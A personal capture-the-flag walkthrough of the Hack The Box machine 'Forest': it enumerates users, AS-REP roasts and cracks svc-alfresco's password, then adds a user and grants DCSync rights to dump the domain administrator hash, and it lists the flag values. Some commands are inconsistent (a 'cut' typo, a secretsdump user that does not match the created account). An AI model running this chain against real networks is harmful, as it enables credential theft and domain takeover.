Forest | 10.10.10.161 | HTB

nmap 
----
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-23 08:27:35Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49901/tcp open  msrpc        Microsoft Windows RPC

rpcclient -U "" -N 10.10.10.161
rpc> getdomusers

this gives us all the users in the box

cut to make it into a valid list 
echo "userlist" | cut -d"]" =f1 | cut -d"[" -f2
and delete all the unwanted users like guests etc

Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi

ASREPRoasting with the userfile 
-------------------------------
┌──(root💀kali)-[~/Downloads/HTB/Forest]
└─# GetNPUsers.py htb.local/ -usersfile user.txt -dc-ip 10.10.10.161 -request
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2efdab3d07d8fad19402ad51e42ea962$110c298aa883b531a0b628ccb70effe2ec5a8c9f2f3e12e8ec4a34119d5cf86024576f3bfa8eddeef2ca1b6db9cdbeec263282510c425ddbb0668eef391ada1f4568c1469aaac5a630652a44fad8f36f08de0e4cc5e1d5b05874356a9db2edec313320662ff24491ac7cf20edfb04e6767257e859d36b761a7b35133d72f52daa77e46b1575e1dca80acc5e21b0e80e767e20663c552e7b97f6b33299ff88a3baf93c4329e85d3817b758ba7f991afdd1e85bbcaf6cdef7593a8b86fa4233f02a558941f45d69c8a8ce1562e366654b318c73e7c8cc8531779705abe551ea0f42ab1222e47ba
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax

we got a hash and we can crack it for the password for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2efdab3d07d8fad19402ad51e42ea962$110c298aa883b531a0b628ccb70effe2ec5a8c9f2f3e12e8ec4a34119d5cf86024576f3bfa8eddeef2ca1b6db9cdbeec263282>

┌──(root💀kali)-[~/Downloads/HTB/Forest]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:04 DONE (2021-07-23 04:32) 0.2298g/s 939255p/s 939255c/s 939255C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

svc-alfresco : s3rvice

login as svc-alfresco into the machine with evil-winrm and grab the user.txt

-------------------------------------------
user.txt : e5e4e47ae7022664cda6eb013fb0d9ed
-------------------------------------------

Enumeration for Bloodhound
--------------------------

┌──(root💀kali)-[~/Downloads/HTB/Forest]
└─# bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 users
INFO: Found 75 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 01M 46S

copy the .json files to a folder and drag the contents to bloodhound

net group "Exchange Windows Permissions" svc-alfresco /add

net user naruto rasengan123 /add /domain

net group "Exchange Windows Permissions" naruto /add

upload PowerView.ps1

Import-Module .\PowerView.ps1

Add-DomainObjectAcl -PrincipalIdentity naruto -TargetIdentity "DC=htb,DC=local" -Rights DCSync

secretsdump.py htb.local/dark:password@10.10.10.161
grab the admin hash and login to evil-winrm and grab the root flag

-------------------------------------------
user.txt : e5e4e47ae7022664cda6eb013fb0d9ed
-------------------------------------------
-------------------------------------------
root.txt : f048153f202bbb2f82622b04d79129cc
-------------------------------------------
